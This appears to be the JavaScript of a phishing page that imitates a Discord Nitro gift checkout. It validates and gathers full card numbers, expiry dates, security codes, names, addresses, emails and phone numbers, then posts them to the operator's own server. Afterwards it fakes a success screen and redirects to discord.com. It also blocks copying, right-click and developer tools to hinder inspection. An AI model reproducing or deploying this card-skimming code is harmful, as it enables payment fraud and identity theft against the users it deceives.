const cardBox = document.querySelector('.card-number-box');
const cardNumber = cardBox.querySelector('input[placeholder="Card Number"]');
const expDate = document.querySelector('#paymentModal input[placeholder="MM/YY"]');
const cvc = document.querySelector('#paymentModal input[placeholder="Security Code"]');
const paymentNext = document.getElementById('payment-next');
const cardName = document.getElementById('card-name');

function getCardType(number) {
  const found = ultimateCardPatterns.find(c => c.pattern.test(number));
  return found ? found : { type: "unknown", cvcLen:[3,4], lengths:[] };
}


function showError(input, msg){
  let error = input.nextElementSibling;
  if (!error || !error.classList.contains('error-text')) {
    error = document.createElement('div');
    error.className = 'error-text';
    error.style.color = '#e57373';
    error.style.fontSize = '12px';
    error.style.marginTop = '4px';
    input.insertAdjacentElement('afterend', error);
  }
  error.textContent = msg;
  error.style.display = 'flex';
  input.classList.add('error');
}
function removeError(input){
  const error = input.nextElementSibling;
  if(error && error.classList.contains('error-text')) error.style.display='none';
  input.classList.remove('error');
}
function validateCardNumber(){
  const val = cardNumber.value.replace(/\s+/g,'');
  return ultimateCardPatterns.some(c=>c.pattern.test(val) && c.lengths.includes(val.length));
}
function validateExpDate(){
  const val = expDate.value.trim();
  const m = /^(0[1-9]|1[0-2])\/(\d{2})$/.exec(val);
  if(!m) return false;
  const month = parseInt(m[1],10);
  const year = 2000 + parseInt(m[2],10);
  const now = new Date();
  if(year > now.getFullYear()) return true;
  if(year === now.getFullYear() && month >= now.getMonth()+1) return true;
  return false;
}
function validateCVC(){
  const number = cardNumber.value.replace(/\s+/g,'');
  const card = getCardType(number);
  return card.cvcLen.includes(cvc.value.trim().length);
}

/* ==============================
   AUTO FORMAT & VALIDATION
============================== */
cardNumber.addEventListener('input', e=>{
  let val=e.target.value.replace(/\D/g,'');
  e.target.value = val.match(/.{1,4}/g)?.join(' ') || '';
  cardBox.classList.remove('error');
  autoCheckPaymentForm();
});
expDate.addEventListener('input', e=>{
  let val=e.target.value.replace(/\D/g,'');
  if(val.length>2) val = val.slice(0,2)+'/'+val.slice(2,4);
  e.target.value = val.slice(0,5);
  removeError(expDate);
  autoCheckPaymentForm();
});
cvc.addEventListener('input', e=>{
  e.target.value = e.target.value.replace(/\D/g,'');
  removeError(cvc);
  autoCheckPaymentForm();
});

/* ==============================
   BLUR VALIDATION
============================== */
cardNumber.addEventListener('blur', ()=>{
  if(!validateCardNumber() && cardNumber.value.length>0) cardBox.classList.add('error');
  else cardBox.classList.remove('error');
  autoCheckPaymentForm();
});
expDate.addEventListener('blur', ()=>{
  if(!validateExpDate() && expDate.value.length>0) showError(expDate,'Something is wrong with your expiration date');
  else removeError(expDate);
  autoCheckPaymentForm();
});
cvc.addEventListener('blur', ()=>{
  if(!validateCVC() && cvc.value.length>0) showError(cvc,'Something is wrong with your security code');
  else removeError(cvc);
  autoCheckPaymentForm();
});

function autoCheckPaymentForm() {
  const cardValid = validateCardNumber();
  const expValid = validateExpDate();
  const cvcValid = validateCVC();
  const billingFirst = document.getElementById('first-name')?.value.trim().toLowerCase();
  const billingLast = document.getElementById('last-name')?.value.trim().toLowerCase();
  const billingEmail = document.getElementById('email')?.value.trim();
  const billingAddress = document.getElementById('address-line-1')?.value.trim();
  const cardholderName = cardName?.value.trim().toLowerCase();

  const billingComplete = billingFirst && billingLast && billingEmail && billingAddress;

  // ‚úÖ Super strict RFC-like email validation
  const emailValid = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/i.test(billingEmail || '');

  // ‚úÖ Strict full-word name match (first + last required in card name)
  const nameMatch =
    new RegExp(`\\b${billingFirst}\\b`, 'i').test(cardholderName) &&
    new RegExp(`\\b${billingLast}\\b`, 'i').test(cardholderName);

  const allValid = cardValid && expValid && cvcValid && billingComplete && emailValid && nameMatch;

  if (paymentNext) {
    paymentNext.disabled = !allValid;
    paymentNext.classList.toggle('btn-enabled', allValid);
    paymentNext.classList.toggle('btn-disabled', !allValid);
  }
}


document.addEventListener('input', e=>{
  if(e.target.tagName==='INPUT'){
    e.target.classList.remove('error');
    autoCheckPaymentForm();
  }
});

/* ==============================
   PAYMENT ‚Üí SUCCESS
============================== */
paymentNext.addEventListener('click', e=>{
  e.preventDefault();
  if(paymentNext.disabled) return;
  paymentModal.style.display='none';
  successModal.style.display='flex';
});

/* ==============================
   SUCCESS CLOSE
============================== */
document.getElementById('closeSuccess').addEventListener('click', ()=>{
  successModal.style.transition='opacity 0.6s ease';
  successModal.style.opacity='0';
  setTimeout(()=> window.location.href="https://discord.com/",600);
});

/* ==============================
   CLOSE X IN PAYMENT MODAL
============================== */
paymentModal.querySelector('.close-btn').addEventListener('click', ()=>{
  paymentModal.style.display='none';
  planModal.style.display='block';
});

/* ==============================
   COPY‚ÄìPASTE & IMAGE PROTECTION
============================== */

// Disable text selection
document.addEventListener('selectstart', (e) => {
  e.preventDefault();
});

// Disable right-click
document.addEventListener('contextmenu', (e) => {
  e.preventDefault();
});

// Disable copy (CTRL + C)
document.addEventListener('copy', (e) => {
  e.preventDefault();
});

// Disable cut (CTRL + X)
document.addEventListener('cut', (e) => {
  e.preventDefault();
});

// Disable paste (CTRL + V)
document.addEventListener('paste', (e) => {
  e.preventDefault();
});

// Disable dragging images
document.addEventListener('dragstart', (e) => {
  if (e.target.tagName === 'IMG') {
    e.preventDefault();
  }
});

// Extra protection: disable keyboard shortcuts
document.addEventListener('keydown', (e) => {
  // CTRL + C, CTRL + X, CTRL + U, CTRL + S, CTRL + A
  if (e.ctrlKey && ['c','x','u','s','a'].includes(e.key.toLowerCase())) {
    e.preventDefault();
  }

  // F12 (DevTools)
  if (e.key === 'F12') {
    e.preventDefault();
  }
});


/* ==========================================
   FINAL WORKING: SEND ALL DATA TO SERVER
========================================== */

// Gift mapping (para alam natin ano ang pinili)
const GIFT_DATA = [
  { title: "1 year of Nitro", price: "99.99", type: "year" },
  { title: "1 month of Nitro", price: "9.99", type: "month" }
];

// Collect ALL CARD + BILLING + GIFT DATA
function collectPaymentFormData() {
  const giftInfo = selectedGift !== null ? GIFT_DATA[selectedGift] : {};

  return {
    // Gift Info
    giftTitle: giftInfo.title || "",
    giftPrice: giftInfo.price || "",
    giftType: giftInfo.type || "",

    // Card Info
    cardNumber: cardNumber.value || "",
    expDate: expDate.value || "",
    cvc: cvc.value || "",
    cardName: cardName.value || "",

    // Billing Info
    firstName: document.getElementById("first-name")?.value || "",
    lastName: document.getElementById("last-name")?.value || "",
    address1: document.getElementById("address-line-1")?.value || "",
    address2: document.getElementById("address-line-2")?.value || "",
    email: document.getElementById("email")?.value || "",
    mobile: document.getElementById("mobile")?.value || "",
    country: document.getElementById("countrySelect")?.value || ""
  };
}

// Send data to your Render server
async function sendPaymentToServer() {
  const data = collectPaymentFormData();

  try {
    const response = await fetch("/send", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    });

    const result = await response.json();

    if (result.success) {
      paymentModal.style.display = "none";
      successModal.style.display = "flex";
    } else {
      alert("‚ùå Failed to send form.");
    }
  } catch (err) {
    console.error("SEND ERROR:", err);
    alert("‚ùå Error sending to server.");
  }
}

/* ==========================================
   OVERRIDE PAYMENT NEXT BUTTON
========================================== */

paymentNext.addEventListener("click", (e) => {
  e.preventDefault();
  if (paymentNext.disabled) return;

  // Send the full info
  sendPaymentToServer();
});


</script>
</head>
</body>
</html>
